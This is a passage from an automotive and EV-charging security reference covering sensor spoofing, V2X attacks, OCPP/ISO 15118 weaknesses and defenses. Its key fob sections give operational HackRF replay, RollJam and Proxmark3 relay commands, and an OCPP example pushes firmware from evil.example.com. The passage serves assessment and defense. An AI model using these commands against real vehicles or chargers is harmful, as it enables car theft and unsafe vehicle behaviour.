**Camera defense.** Multi-camera cross-validation (comparing detections from forward, rear, and side cameras to check for physically impossible observations visible to only one camera), temporal filtering (requiring a detection to persist across multiple consecutive frames before triggering an ADAS response — a single-frame phantom projection would be filtered out), and redundancy with non-visual sensors (RADAR and LiDAR are immune to visual adversarial patches and projected perturbations). IR-blocking optical filters on the camera lens reduce the effectiveness of IR LED blinding (though they also reduce the camera's low-light sensitivity). Anti-bloom sensor design (CMOS sensors with per-pixel exposure control that prevent a bright source from saturating adjacent pixels) limits the blast radius of laser-dazzle attacks to the directly-illuminated pixels rather than blooming across the entire frame.

### 7.3 RADAR interference and spoofing

Automotive RADAR (77 GHz FMCW) underpins adaptive cruise control, collision warning, and blind-spot detection.

**Jamming.** A 77 GHz noise source (commercially available as test equipment from TI, Infineon, and Analog Devices FMCW evaluation modules) raises the receiver's noise floor, reducing sensitivity and detection range. The victim RADAR may report no targets or reduced range.

**Spoofing.** The attacker receives the victim's FMCW chirp, adds a controlled frequency offset (Δf) and time delay (Δt), and retransmits. The victim interprets the retransmitted signal as a target at range R = c·Δt/2 and velocity v = c·Δf/(2·f_c) where f_c is the carrier frequency. Creating a phantom vehicle at 50 m moving at 30 km/h requires Δt ≈ 333 ns and Δf ≈ 4.3 kHz. The chirp parameters (start frequency, bandwidth, chirp rate, repetition interval) can be reverse-engineered by recording the RADAR's emissions with a spectrum analyzer or SDR.

Defense measures for RADAR operate at both the waveform and processing levels. Randomized chirp parameters use pseudo-random chirp slopes, start frequencies, and timing intervals derived from a cryptographic PRNG seeded with a per-vehicle secret. The attacker, unable to predict the next chirp parameters, cannot generate a correctly offset spoofed return — the spoofed signal falls outside the matched filter's passband and is rejected as noise. MIMO RADAR (multiple independent transmit/receive antenna pairs providing spatial diversity) enables angle-of-arrival verification: a spoofed signal arriving from the attacker's physical location (not from the claimed target's direction) produces an inconsistent angle-of-arrival across the MIMO channels and is rejected. Cross-sensor fusion (RADAR targets validated against camera and LiDAR detections) provides defense-in-depth against single-modality spoofing.

Emerging defense: automotive RADAR waveform authentication (analogous to LiDAR pulse fingerprinting), where the chirp signal embeds a cryptographic watermark that the attacker cannot reproduce without knowledge of the secret key. This is under active research (IEEE publications 2022-2024) but not yet deployed in production vehicles.

### 7.4 Ultrasonic sensor attacks

Ultrasonic sensors (40 kHz, < 5 m range, parking assist) are trivially attacked. Spoofing: transmitting 40 kHz pulses creates phantom obstacles. Jamming: continuous 40 kHz emission masks real echoes. Hardware: an ultrasonic transducer (<$5) driven by an Arduino with a piezo driver circuit. Range: effective at distances up to 3-5 meters from the target sensor.

### 7.5 Multi-sensor fusion attacks

Modern ADAS fuses LiDAR + camera + RADAR + ultrasonics. A sophisticated attacker can create stimuli consistent across modalities (simultaneously spoofing LiDAR points and projecting a visual phantom so fusion sees corroborating evidence) or exploit fusion-algorithm failure modes. Research by Tu et al. (2020, "Physically Realizable Adversarial Examples for LiDAR Object Detection") and Cao et al. (2021, "Invisible for both Camera and LiDAR") explored simultaneous multi-modal attacks.

Defense against multi-sensor fusion attacks requires a layered approach operating at multiple levels of the perception pipeline:

**Temporal consistency checking.** A phantom object that appears instantaneously in one frame without a physically plausible trajectory history across previous frames is flagged as suspicious. Real objects have continuous trajectories governed by Newtonian mechanics — they cannot teleport, cannot instantaneously change velocity by more than a physically possible amount (given the object's estimated mass and the maximum forces available), and cannot appear from behind an occluder without a corresponding approach trajectory. Temporal consistency creates a minimum attack duration: the attacker must sustain the spoofed stimulus across multiple sensor frames (typically 5-10 frames at 10 Hz = 0.5-1.0 seconds) with a physically consistent trajectory before the fusion algorithm accepts it as a confirmed track.

**Physics-based plausibility validation.** Beyond trajectory consistency, the fusion system checks: object size vs. range (a detected object at 50 m cannot have a cross-section larger than a truck), velocity vs. road context (an object moving at 200 km/h on a residential street is implausible), acceleration bounds (passenger vehicles cannot exceed ~1.0g lateral acceleration; objects exceeding this are flagged), and object class vs. behavior (a "pedestrian" classification moving at 80 km/h is contradictory).

**Map-based validation.** Detected objects are cross-referenced against the HD (High-Definition) map. An object detected inside a building footprint, underground, or above ground level by more than the maximum vehicle height is classified as a sensor artifact. Objects on non-traversable surfaces (median barriers, buildings, water bodies) that are reported as moving vehicles are flagged.

**Adversarial robustness training.** The perception neural networks (both camera-based CNNs and LiDAR-based point-cloud networks) are trained with adversarial examples generated by projected gradient descent (PGD), adversarial patch augmentation, and domain-specific physical perturbations. This increases the perturbation budget required for a successful attack — the attacker must create stronger perturbations (which are more visible and easier to detect) to fool a robustly-trained model. See Domain 18 for the theoretical foundations of adversarial training and certified robustness.

---

## 8. V2X (Vehicle-to-Everything)

### 8.1 DSRC (IEEE 802.11p / 802.11bd)

DSRC operates in the 5.9 GHz band (5.850–5.925 GHz US, 5.855–5.925 GHz Europe). IEEE 802.11p modifies standard 802.11 for vehicular use. The key modification is OCB (Outside the Context of a BSS) mode: nodes communicate directly without association (no scanning, authentication, or association handshake — the entire join overhead of standard Wi-Fi is eliminated). This enables sub-millisecond channel access latency.

The WAVE (Wireless Access in Vehicular Environments) protocol stack is defined by the IEEE 1609 family:

**IEEE 1609.2** (Security Services): Defines the cryptographic message formats (SignedData, EncryptedData), certificate formats, and PKI operations. All BSMs are signed using ECDSA on the NIST P-256 curve. The standard specifies implicit certificates (where the public key is reconstructed from the certificate and the CA's public key, saving bandwidth) and explicit certificates (where the full public key is included). Encryption uses ECIES (Elliptic Curve Integrated Encryption Scheme) with AES-128-CCM for confidentiality of non-broadcast messages (e.g., toll payment, EV charging negotiation).

**IEEE 1609.3** (Networking Services): Defines WSMP (WAVE Short Message Protocol), a lightweight transport layer that bypasses the TCP/IP stack entirely for safety-critical messages. WSMP provides connectionless, unreliable delivery (appropriate for broadcast safety messages that are time-critical and loss-tolerant — a missed BSM is replaced by the next one 100 ms later). WSMP messages are identified by a PSID (Provider Service Identifier) that maps to a specific application.

**IEEE 1609.4** (Multi-Channel Operation): Defines the channel switching mechanism. The 5.9 GHz band is divided into one Control Channel (CCH, channel 178) and multiple Service Channels (SCHs, channels 172-184). Safety messages (BSMs) are transmitted on the CCH. Non-safety services (infotainment downloads, toll payment) use SCHs. Vehicles alternate between CCH and SCH at synchronized 50 ms intervals (the "alternating" scheme) or remain on CCH continuously with optional SCH access (the "continuous" scheme for safety-only vehicles).

DSRC achieves <5 ms end-to-end latency (measured from application layer to application layer, including signing and verification), ~300 m V2V range in typical conditions, and up to 1 km V2I range with high-gain infrastructure antennas.

### 8.2 C-V2X (Cellular V2X)

C-V2X uses the 3GPP PC5 sidelink for direct device-to-device communication without a base station. Mode 4 (LTE V2X) / Mode 2 (NR V2X) provides autonomous resource selection via Sensing-Based Semi-Persistent Scheduling (SB-SPS): each vehicle listens for occupied time-frequency resources, selects unoccupied slots, and semi-persistently reserves them for its BSM transmissions. 5G NR V2X (Release 16+) adds: higher reliability (99.999% for safety messages), lower latency (<3 ms direct), higher data rates (sensor sharing, cooperative perception), and groupcast/unicast (platoon-specific communication).

C-V2X and DSRC compete for deployment. China has mandated C-V2X nationwide (with the LTE-V2X standard deployed across major cities since 2021), and South Korea has adopted C-V2X for its V2X infrastructure. The US FCC reallocated 45 MHz of the 5.9 GHz band from DSRC to unlicensed Wi-Fi use in 2020 (reducing the DSRC allocation from 75 MHz to 30 MHz), which effectively tilted US deployments toward C-V2X (which can operate on the remaining spectrum or on cellular bands). Europe, through ETSI ITS-G5 (their DSRC profile), has historically favored DSRC but is moving toward a technology-neutral policy that supports both.

The security considerations (PKI, certificate management, misbehavior detection, privacy-preserving pseudonyms) are largely technology-agnostic — the IEEE 1609.2 security layer operates above the radio technology and applies equally whether the underlying transport is DSRC or C-V2X. The SCMS infrastructure serves both technologies.

### 8.3 BSM (Basic Safety Message)

The BSM (SAE J2735) is broadcast at 10 Hz by every V2X vehicle. Structure:

```
BSM Part I (mandatory, fixed fields):
┌─────────────────────────────────────────────────────────────────┐
│ Temporary ID        : 4 bytes (pseudonym, rotated every 5 min) │
│ DSecond             : 2 bytes (ms within current minute)        │
│ Latitude            : 4 bytes (1/10 micro-degree resolution)    │
│ Longitude           : 4 bytes (1/10 micro-degree resolution)    │
│ Elevation           : 2 bytes (0.1 m resolution)                │
│ PositionalAccuracy  : 4 bytes (semi-major/minor axis + orient.) │
│ TransmissionState   : 2 bits  (P/R/N/D)                        │
│ Speed               : 13 bits (0.02 m/s units, max 163.82 m/s) │
│ Heading             : 2 bytes (0.0125° units)                   │
│ SteeringWheelAngle  : 1 byte  (1.5° units)                     │
│ AccelSet4Way        : 7 bytes (lon/lat/vert accel + yaw rate)   │
│ BrakeSystemStatus   : 2 bytes (brakes, traction, ABS, SC)      │
│ VehicleSize         : 3 bytes (width + length)                  │
└─────────────────────────────────────────────────────────────────┘

BSM Part II (optional, variable):
- PathHistory       : up to 23 position/heading/speed samples
- PathPrediction    : predicted path + confidence
- EventFlags        : hard braking, ABS active, TC loss, flat tire
- ExteriorLights    : headlamps, turn signals, flashers
```

Part II elements are included based on application needs and channel congestion (under high load, Part II may be omitted to reduce size). The BSM enables: intersection collision warning, forward collision warning, emergency electronic brake light, and blind-spot/lane-change warning.

### 8.4 SCMS (Security Credential Management System)

V2X messages are signed with ECDSA (NIST P-256) per IEEE 1609.2. The SCMS PKI architecture:

```
SCMS PKI Hierarchy:

Root CA ─── (offline, air-gapped, multi-party threshold signing)
  │
  ├── Enrollment CA (ECA)
  │     └── Issues enrollment certificates to OBUs/RSUs at manufacturing
  │
  ├── Pseudonym CA (PCA)
  │     └── Issues short-lived pseudonym certificates for BSM signing
  │         (~20 certs/week, rotated every 5 min during driving)
  │
  ├── Registration Authority (RA)
  │     └── Privacy intermediary: shuffles OBU requests before
  │         forwarding to PCA (RA knows identity, not certs;
  │         PCA knows certs, not identity — split-knowledge)
  │
  ├── Misbehavior Authority (MA)
  │     └── Receives misbehavior reports, triggers revocation
  │
  └── Linkage Authority (LA)
        └── Manages linkage values for certificate revocation
            (can link all pseudonyms of a misbehaving device)
```

**Enrollment flow.** During manufacturing, the OBU generates a key pair, sends the public key to the ECA, and receives an enrollment certificate binding the OBU's identity to its public key. This enrollment certificate is long-lived (years) and is never transmitted over-the-air — it is used only for pseudonym certificate requests.

**Pseudonym certificate provisioning.** The OBU requests pseudonym certificates by sending its enrollment certificate and a batch of public keys to the RA. The RA verifies the enrollment certificate, strips the identity information, shuffles the request with other OBUs' requests, and forwards the anonymized batch to the PCA. The PCA issues pseudonym certificates (signing each public key) and returns them to the RA, which distributes them back to the respective OBUs. The RA-PCA split ensures that no single entity can de-anonymize a pseudonym certificate.

**Butterfly key expansion.** To reduce bandwidth during provisioning, the OBU and PCA use a deterministic key derivation: from a single seed key pair, multiple pseudonym public keys are expanded using diversification values. The PCA certifies each expanded key without the OBU needing to transmit them individually.

### 8.5 V2X attacks in depth

**BSM spoofing.** An attacker with valid pseudonym certificates (from a compromised OBU, purchased underground, or extracted from a vulnerable SCMS component) broadcasts BSMs with fabricated data — phantom vehicles, phantom emergencies, or false kinematics. The spoofed BSMs pass signature verification because they carry valid cryptographic credentials. This is the hardest V2X attack to defend because the message is cryptographically authentic but semantically false.

**Sybil attacks.** A single attacker generates BSMs from many fake identities (using multiple pseudonym certificates obtained by operating multiple OBUs, or by exploiting a provisioning vulnerability to obtain excess certificates). Effects: phantom traffic jams (causing navigation rerouting), phantom accidents (triggering emergency response), congestion manipulation (influencing adaptive traffic signals in V2I systems). Detection: cross-referencing physical constraints (multiple "vehicles" at identical GPS coordinates, implausibly correlated trajectories, more vehicles than road capacity permits).

**Position spoofing.** BSMs with false position data, combined with GPS spoofing (Domain 20 §3.3) for physical-layer consistency. Plausibility checks (comparing claimed position against RADAR/LiDAR detection of actual neighbors, or receiver's own BSM history) detect implausible claims.

**Certificate revocation flooding.** Mass false misbehavior reports to overwhelm the MA and inflate the CRL, consuming bandwidth and processing time on all OBUs. CRL size management (delta CRLs, hash-based revocation lists) is critical for operational scalability.

**DoS.** Flooding the 5.9 GHz channel with noise or high-rate transmissions. DCC (ETSI TS 102 687) limits legitimate transmitters but cannot constrain a malicious one. Physical-layer jamming requires spatial filtering (beamforming antennas) or frequency agility to counter.

**Time synchronization attacks.** V2X relies on GPS-derived synchronized clocks for message freshness verification. Each BSM carries a DSecond timestamp, and receivers check that incoming BSMs have a timestamp consistent with the receiver's own clock (within a tolerance window, typically 100-500 ms). GPS spoofing (Domain 20 §3.3) that shifts the perceived time at the target vehicle can cause valid BSMs from other vehicles to appear stale (and be rejected) — effectively isolating the target from V2X safety warnings. Conversely, manipulating the attacker's own clock allows sending BSMs with timestamps that pass freshness checks at all receivers despite being fabricated.

**IEEE 1609.2 signed message structure.** Every V2X BSM is wrapped in an IEEE 1609.2 Secured Data structure before transmission:

```
IEEE 1609.2 SignedData structure (simplified):

┌─ Ieee1609Dot2Data ─────────────────────────────────────────────┐
│  protocolVersion: 3                                             │
│  content: SignedData                                            │
│    ├── hashId: SHA-256                                          │
│    ├── tbsData (to-be-signed):                                  │
│    │     ├── payload: Ieee1609Dot2Data (the BSM content)        │
│    │     ├── headerInfo:                                        │
│    │     │     ├── psid: 0x20 (BSM application ID)              │
│    │     │     ├── generationTime: microseconds since epoch     │
│    │     │     ├── expiryTime: (optional)                       │
│    │     │     └── generationLocation: (3D position)            │
│    │     └── extDataHash: (external data reference, if any)     │
│    ├── signer:                                                  │
│    │     ├── certificate: [pseudonym certificate chain]         │
│    │     │     ├── issuer: HashedId8 (PCA certificate hash)     │
│    │     │     ├── toBeSigned:                                  │
│    │     │     │     ├── id: (linkage value or none)            │
│    │     │     │     ├── cracaId: (3 bytes)                     │
│    │     │     │     ├── crlSeries: (for revocation lookup)     │
│    │     │     │     ├── validityPeriod: start + duration       │
│    │     │     │     └── verifyKeyIndicator: EccP256CurvePoint  │
│    │     │     └── signature: ECDSA-P256 (PCA's signature)      │
│    │     └── (or digest: HashedId8 if cert previously sent)     │
│    └── signature: ECDSA-P256 (OBU's signature over tbsData)     │
└─────────────────────────────────────────────────────────────────┘

Verification by receiver:
1. Extract signer certificate (or look up by digest)
2. Verify certificate chain (cert → PCA → Root CA)
3. Check certificate validity period and CRL status
4. Verify ECDSA signature over tbsData using cert's public key
5. Check generationTime is within acceptable window
6. Process BSM payload only if all checks pass
```

The signature overhead adds approximately 130 bytes per BSM (64 bytes ECDSA signature + ~66 bytes compressed certificate or 8-byte digest). At 10 Hz broadcast rate, this is a modest bandwidth cost (1.3 KB/s per vehicle) that provides authentication and integrity for every safety message.

### 8.6 V2X intrusion detection and misbehavior detection

Application-layer plausibility checks: kinematic consistency (200 km/h acceleration from standstill in one BSM interval is impossible), position-heading consistency (claimed heading contradicts path history), inter-vehicle consistency (vehicle A claims position X, but vehicle B at position X detects nothing via its sensors), and physical boundary checks (position inside a building or off-road per HD map).

Collaborative detection aggregates plausibility assessments from multiple receivers. If N independent OBUs flag the same transmitter, confidence in misbehavior increases proportionally. The aggregated report is submitted to the MA for revocation decision. The misbehavior detection pipeline runs locally on each OBU (real-time plausibility checks on every received BSM) and centrally at the MA (correlation across reports from multiple vehicles and infrastructure sensors). Local detection must be computationally lightweight (the OBU processes hundreds of BSMs per second from surrounding vehicles), while central detection can apply more sophisticated analysis (machine learning on historical patterns, cross-referencing with infrastructure sensors, comparing with traffic models).

Specific misbehavior detection algorithms implemented in V2X research prototypes include: SSAM (Sender-Side Anomaly Module — checking that a vehicle's own BSM data is self-consistent before transmission), PBMDS (Position-Based Misbehavior Detection System — triangulating a transmitter's position using multiple receivers' RSSI or time-of-arrival measurements and comparing against the claimed position), and VeReMi (Vehicular Reference Misbehavior Dataset — a standardized evaluation framework for V2X misbehavior detection algorithms that includes ground-truth labels for spoofed, Sybil, and position-falsified BSMs).

---

## 9. EV charging infrastructure security

### 9.1 OCPP (Open Charge Point Protocol)

OCPP governs communication between EV charging stations (Charge Points) and the CSMS (Charging Station Management System). OCPP 1.6 (most widely deployed) supports SOAP/HTTP and JSON/WebSocket. OCPP 2.0.1 uses exclusively JSON/WebSocket with three security profiles: Profile 1 (unsecured — HTTP, for legacy/testing), Profile 2 (TLS with basic authentication), Profile 3 (TLS with mutual X.509 certificates).

Key OCPP messages:

```json
// BootNotification — CP announces itself to CSMS
[2, "msg001", "BootNotification", {
  "chargePointVendor": "VendorX",
  "chargePointModel": "ModelY",
  "chargePointSerialNumber": "SN-123456",
  "firmwareVersion": "1.4.2"
}]

// RemoteStartTransaction — CSMS commands CP to begin charging
// (if unauthenticated, attacker can initiate free charging)
[2, "msg042", "RemoteStartTransaction", {
  "connectorId": 1,
  "idTag": "ATTACKER_RFID_TAG"
}]

// UpdateFirmware — CSMS pushes firmware URL to CP
// (if unsigned, attacker pushes malicious firmware)
[2, "msg099", "UpdateFirmware", {
  "location": "https://evil.example.com/firmware.bin",
  "retrieveDate": "2026-05-08T12:00:00Z"
}]

// Reset — CSMS reboots the CP (DoS)
[2, "msg100", "Reset", {"type": "Hard"}]
```

**Vulnerabilities.** OCPP 1.6 with Profile 1 or weak authentication allows: unauthorized RemoteStartTransaction (free charging), UpdateFirmware with attacker-controlled URL (malicious firmware), Reset commands (DoS), and ChangeConfiguration to alter pricing/metering (billing fraud). CSMS compromise (via web application vulnerabilities — the CSMS is typically a cloud-hosted web application) gives control over all managed CPs.

Researchers from Concordia University (Nasr et al., 2023) and Sandia National Laboratories documented: CPs accepting unsigned firmware updates, CPs not validating CSMS TLS certificates (accepting self-signed certs), and CPs exposing OCPP WebSocket endpoints on local network interfaces without authentication.

### 9.2 ISO 15118 Plug & Charge

ISO 15118 defines EV-to-EVSE communication over PLC (HomePlug Green PHY at up to 10 Mbps on the Control Pilot wire). On top of PLC, a TLS-secured TCP/IP connection carries the ISO 15118 application protocol. **Plug & Charge** (ISO 15118-2 and -20) enables automatic authentication: the EV presents a contract certificate (from the eMSP), the EVSE validates the chain (EV contract cert → eMSP Sub-CA → V2G Root CA), and charging begins without user interaction.

**PLC attack surface.** The HomePlug GreenPHY signal is accessible at the charging plug. An attacker splicing a PLC transceiver into the CP wire can sniff traffic, inject packets, or MitM the TLS connection if the implementation has weaknesses. Southwest Research Institute (SwRI, 2023) demonstrated PLC-layer eavesdropping and credential extraction from improperly-secured implementations.

**Rogue EVSE.** A malicious charging station (either purpose-built by an attacker or a legitimate station with compromised firmware) can: present a fraudulent EVSE certificate (if the EV does not properly validate the certificate chain — accepting self-signed, expired, or revoked certificates), harvest the EV's contract certificate during the TLS handshake (the contract certificate is sent in the clear during the TLS ClientHello/Certificate exchange in TLS 1.2 — ISO 15118-20's mandatory TLS 1.3 encrypts the certificate, mitigating this), or inject malicious parameters during the charge-parameter negotiation phase (requesting dangerously high voltage or current beyond the EV's rated capacity, or manipulating the payment amount).

The ISO 15118 Plug & Charge TLS handshake flow:

```
ISO 15118 Plug & Charge — Connection Establishment:

1. Physical Layer: EV plugs in → Control Pilot signal established
   (PWM duty cycle negotiation: EVSE announces max current)

2. PLC Association: HomePlug GreenPHY SLAC (Signal Level Attenuation
   Characterization) → EV and EVSE establish PLC link on CP wire

3. IP Configuration: EV obtains IP via DHCP or link-local (169.254.x.x)

4. TCP Connection: EV connects to EVSE on TCP port 15118

5. TLS Handshake (ISO 15118-2 / TLS 1.2):
   EV → EVSE: ClientHello (TLS 1.2, cipher suites)
   EVSE → EV: ServerHello, Certificate (EVSE cert chain)
   EV → EVSE: Certificate (EV contract cert), ClientKeyExchange,
              CertificateVerify, Finished
   EVSE → EV: Finished
   → Mutual TLS established (both parties authenticated)

6. V2G Session: ServiceDiscovery → ChargeParameterDiscovery →
   PaymentServiceSelection → Authorization → CableCheck →
   PreCharge → PowerDelivery → CurrentDemand → PowerDelivery(stop)

Attack surface at each step:
- Step 2: PLC injection/sniffing at the charging plug
- Step 5: Certificate validation bypass, credential harvesting
- Step 6: Parameter manipulation (voltage, current, billing)
```

Real-world EV charging CVEs include vulnerabilities discovered in ChargePoint, ABB, and Schneider Electric EVSE products. The Pentest Partners team (2022) demonstrated remote exploitation of multiple EVSE models via exposed OCPP WebSocket endpoints, obtaining firmware-level access and the ability to modify charging parameters. Alpitronic HYC series vulnerabilities (disclosed 2023) allowed unauthenticated access to the charger's diagnostic interface, enabling firmware extraction and modification.

### 9.3 ISO 15118-20 improvements

ISO 15118-20 (published 2022, successor to ISO 15118-2) addresses multiple security shortcomings identified in the original specification:

**Mandatory TLS 1.3.** ISO 15118-2 permitted TLS 1.2, which allows vulnerable cipher suites (CBC mode, SHA-1) and exposes certificates in plaintext during the handshake. TLS 1.3 eliminates legacy cipher suites, encrypts the certificate exchange (preventing passive eavesdropping of contract certificates at the charging plug), and provides 0-RTT or 1-RTT handshake (reducing connection setup time for the charging session).

**Mandatory mutual TLS.** ISO 15118-2's mutual authentication was optional in some profiles. ISO 15118-20 requires both the EV and the EVSE to present and validate certificates during the TLS handshake. This prevents rogue-EVSE attacks: an attacker's charging station cannot impersonate a legitimate EVSE because it lacks a valid certificate chain rooted in the V2G Root CA.

**Improved certificate lifecycle.** ISO 15118-20 defines automated certificate installation (the EV can request a new contract certificate during a charging session, without requiring a manual provisioning step), certificate update (seamless renewal before expiration), and revocation checking (the EVSE verifies the EV's certificate against a CRL or OCSP responder).

**V2G (bidirectional charging) authorization.** ISO 15118-20 adds explicit protocol support for bidirectional power flow, including grid-operator authorization (the EVSE verifies that the grid operator permits discharge at the current time and location) and energy-transfer scheduling (the EV and EVSE negotiate a charging/discharging schedule that can be modified in real-time based on grid conditions).

### 9.4 Charging infrastructure as grid attack vector

V2G-capable EVs can discharge into the grid. A compromised fleet (or a compromised CSMS controlling many V2G stations) could coordinate simultaneous large power draw or injection, destabilizing the local grid — bridging automotive security with ICS/OT security (Domain 16). OCPP 2.0.1 includes smart charging profiles (CSMS-controlled power limits and schedules), but a compromised CSMS could abuse these for grid destabilization.

Defense requires coordination between the automotive and energy sectors: independent grid-side load monitoring at the distribution-transformer level (detecting anomalous aggregate demand patterns that deviate from predicted load curves), rate-limiting on power draw/injection changes at the EVSE level (preventing rapid oscillation — limiting the rate of change to no more than X kW per minute, regardless of CSMS commands), and multi-party V2G authorization (the EV owner, the eMSP, and the grid operator must all authorize bidirectional power flow — a compromised CSMS alone should not be sufficient to command grid discharge from the entire fleet).

The scale of the threat is proportional to V2G deployment: a fleet of 10,000 V2G-capable EVs, each with an 11 kW bidirectional charger, represents 110 MW of controllable load — sufficient to destabilize a small distribution grid if coordinated maliciously. As V2G adoption grows (projected to reach millions of vehicles by 2030), the cybersecurity of the CSMS and OCPP infrastructure becomes a critical infrastructure protection concern, warranting the same level of attention as SCADA systems in power generation and distribution (Domain 16).

---

## 9A. Key Fob Attack Tools

Building on §3 (theory, cipher weaknesses, relay BOM), this section covers operational tooling for key fob security assessment.

### 9A.1 HackRF One — signal capture and replay

HackRF One covers 1 MHz–6 GHz, 8-bit quadrature, 20 MHz bandwidth — sufficient for all automotive RKE frequencies.

```bash
# Capture 433.92 MHz key fob signal (10 MHz bandwidth, 8M samples/sec)
hackrf_transfer -r keyfob_capture.raw -f 433920000 -s 8000000 -a 1 -l 32 -g 30

# -r      : receive mode, output to file
# -f      : center frequency in Hz (433.92 MHz EU, 315 MHz NA)
# -s      : sample rate
# -a 1    : antenna power enable
# -l 32   : LNA gain (0-40 dB)
# -g 30   : VGA gain (0-62 dB)

# Replay captured signal
hackrf_transfer -t keyfob_capture.raw -f 433920000 -s 8000000 -a 1 -x 30

# -t      : transmit mode, input from file
# -x 30   : TX VGA gain (0-47 dB)
```

**Note:** Raw replay works only against fixed-code systems (garage doors, older vehicles pre-2000). Rolling-code systems (§3.1) reject replayed codes because the counter has advanced. Raw replay is a useful first test to confirm whether the target uses rolling codes.

### 9A.2 Universal Radio Hacker (URH) signal analysis

URH demodulates, decodes, and analyzes captured RF signals. Workflow for key fob assessment:

```bash
# Install URH
pip install urh

# Launch GUI with captured file
urh keyfob_capture.raw
```

URH workflow:

1. **Interpretation tab** — set modulation (ASK/OOK for most key fobs), samples/symbol, center frequency. URH auto-detects modulation in most cases.
2. **Analysis tab** — view demodulated bitstream. Identify preamble (typically 12-16 bits of alternating 1010), sync word, and payload.
3. **Generator tab** — modify payload fields and re-encode for transmission.

Key fob protocol structure (typical KeeLoq-based RKE):

```
┌──────────┬───────────┬─────────────────────┬──────────┐
│ Preamble │ Sync Word │ Encrypted Rolling   │ Fixed    │
│ 12 bits  │ 8 bits    │ Code (32 bits)      │ Serial   │
│ 10101... │ FF00      │ KeeLoq-encrypted    │ (28 bits)│
│          │           │ counter + button ID │          │
└──────────┴───────────┴─────────────────────┴──────────┘
```

The fixed serial number identifies the fob. The encrypted rolling code changes each press. URH can extract the fixed serial (useful for targeting a specific vehicle) but cannot decrypt the rolling code without the manufacturer key.

### 9A.3 RollJam operational setup (2x HackRF)

Building on the conceptual flow in §3.1. Physical setup: Radio A (HackRF + directional Yagi antenna, within 2m of vehicle) jams the target frequency continuously. Radio B (HackRF + omnidirectional antenna, within 5m of fob, spatially offset from jam path) captures fob transmissions that bleed past the directional jam. A Raspberry Pi or laptop runs a GNU Radio flowgraph coordinating jam/capture/replay timing (`Source (osmosdr) → LPF → ASK Demod → File Sink`, with threshold detector triggering jam-stop and replay). Spatial separation between jam and capture antennas is critical — Radio B must hear the fob despite Radio A's jamming. Success rate >90% in controlled testing with proper antenna placement.

### 9A.4 Relay attack (2x Proxmark3)

Building on the relay BOM in §3.2, Proxmark3 RDV4 provides both LF (125/134 kHz) and HF (13.56 MHz) capabilities needed for PKE relay.

```bash
# Near-vehicle relay — capture LF challenge
# Proxmark3 unit A, positioned within 2m of vehicle door handle
proxmark3 /dev/ttyACM0
[usb] pm3 --> lf read -v
# Captures the 125 kHz challenge signal from the vehicle's
# door-handle antenna. The signal is digitized and forwarded
# over the communication link (Bluetooth or IP) to Unit B.

# Near-fob relay — retransmit LF challenge
# Proxmark3 unit B, positioned within 1m of fob (e.g., outside
# owner's front door, apartment wall)
proxmark3 /dev/ttyACM1
[usb] pm3 --> lf sim -d <captured_challenge_data>
# Emits the captured challenge at 125 kHz. The fob wakes,
# processes the challenge, and responds via UHF (315/433 MHz).
# The vehicle receives the fob's UHF response directly
# (UHF range is tens of meters — no relay needed for the response).
```

Commercially available relay kits (sold underground) integrate both units into purpose-built devices with automatic forwarding, eliminating the need for manual Proxmark3 operation. Total relay latency: <5 ms, well within PKE timeout windows (§3.2).

### 9A.5 Tesla BLE relay

Building on the NCC Group research (§3.3). Hardware: two Nordic nRF52840 (or Cypress CYW20735) dongles as link-layer relays. Device A (near vehicle) acts as BLE peripheral mimicking phone advertisement, forwards GATT operations over TCP/IP to Device B (near phone), which connects as BLE central to the owner's phone. Link: Wi-Fi, cellular, or any IP transport. Added latency: ~8 ms (NCC Group measured), within Tesla's ~30 ms BLE timeout. Mitigation check: PIN-to-Drive enabled = relay unlocks but cannot drive; UWB phone key active = relay fails; BLE key only (no UWB) = fully vulnerable.

### 9A.6 TPMS spoofing

TPMS sensors transmit at 315 MHz (NA) or 433.92 MHz (EU) with fixed sensor IDs and no authentication.

```bash
# Capture and decode TPMS signal
hackrf_transfer -r tpms_capture.raw -f 315000000 -s 2000000
rtl_433 -r tpms_capture.raw -R 60   # -R 60 = TPMS protocol

# Spoof low-pressure warning: craft ASK/OOK signal with known
# sensor ID and pressure = 15 kPa (below 25 kPa warning threshold)
# Transmit via GNU Radio or rpitx
```

Impact: dashboard distraction, alarm fatigue (driver ignores genuine warnings), social engineering setup. No actuator authority — TPMS has no vehicle control impact.

### 9A.7 Faraday defense validation

```bash
# Test at UHF (433.92 MHz): capture baseline, then with fob in pouch
hackrf_transfer -r baseline.raw -f 433920000 -s 2000000 -l 32 -g 30
hackrf_transfer -r shielded.raw -f 433920000 -s 2000000 -l 32 -g 30
# Compare peak amplitudes in URH — expect >60 dB attenuation

# Test at LF (125 kHz) with Proxmark3:
proxmark3 /dev/ttyACM0
[usb] pm3 --> lf tune   # Compare field strength in/out of pouch
```

Quality pouch: 60+ dB across 100 kHz-6 GHz. Worn/degraded pouches may leak at specific frequencies — periodic validation warranted.

---

## 9B. OBD-II Exploitation

Building on §2 (J1962/J1979/J2534 theory and dongle attack surface), this section covers practical OBD-II exploitation tooling.

### 9B.1 python-OBD scripts

`python-OBD` provides a high-level interface over ELM327-compatible adapters.

```python
import obd

# Connect to ELM327 adapter (USB or Bluetooth)
connection = obd.OBD("/dev/ttyUSB0")  # or "COM3" on Windows
# For Bluetooth: obd.OBD("/dev/rfcomm0")

# --- PID scan: enumerate all supported PIDs ---
supported = connection.supported_commands
for cmd in sorted(supported, key=lambda c: c.pid):
    print(f"PID 0x{cmd.pid:02X}: {cmd.name} — {cmd.desc}")

# --- Read specific PIDs ---
rpm = connection.query(obd.commands.RPM)
speed = connection.query(obd.commands.SPEED)
coolant = connection.query(obd.commands.COOLANT_TEMP)
print(f"RPM: {rpm.value}, Speed: {speed.value}, Coolant: {coolant.value}")

# --- DTC retrieval and clearing ---
dtcs = connection.query(obd.commands.GET_DTC)
print(f"Stored DTCs: {dtcs.value}")
# [(P0300, 'Random/Multiple Cylinder Misfire'), ...]

# Clear DTCs (Mode 04) — USE WITH CAUTION:
# Clearing DTCs also resets readiness monitors (emission test impact)
clear = connection.query(obd.commands.CLEAR_DTC)
print(f"DTC clear response: {clear.value}")

# --- VIN extraction (Mode 09, PID 02) ---
vin = connection.query(obd.commands.VIN)
print(f"VIN: {vin.value}")
# Returns 17-character VIN string

# --- Continuous monitoring ---
connection.watch(obd.commands.RPM)
connection.watch(obd.commands.SPEED)
connection.start()  # Async mode — callbacks on value change
```

### 9B.2 CANtact / SocketCAN setup

For direct CAN bus access beyond standard OBD-II PIDs, a CANtact (or similar slcan adapter) provides raw SocketCAN:

```bash
